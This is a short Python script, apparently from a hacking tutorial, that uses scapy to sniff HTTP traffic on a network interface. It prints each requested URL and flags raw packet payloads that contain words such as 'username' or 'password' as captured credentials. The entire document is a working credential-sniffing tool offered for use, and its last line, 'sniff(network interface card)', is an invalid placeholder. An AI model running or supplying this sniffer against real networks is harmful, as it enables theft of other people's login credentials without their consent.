import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)# dont store anything and call process_sniffed_packet for every packet you capture.

#  Host + Path gives us the full Url
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load# get the Raw layer and from that get the load field
        #use packet.show()  to see all the layers and fields available in the packet
        keywords = ["username", "user", "pass", "password", "Username", "Password"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password" + login_info + "\n\n")



sniff(network interface card)
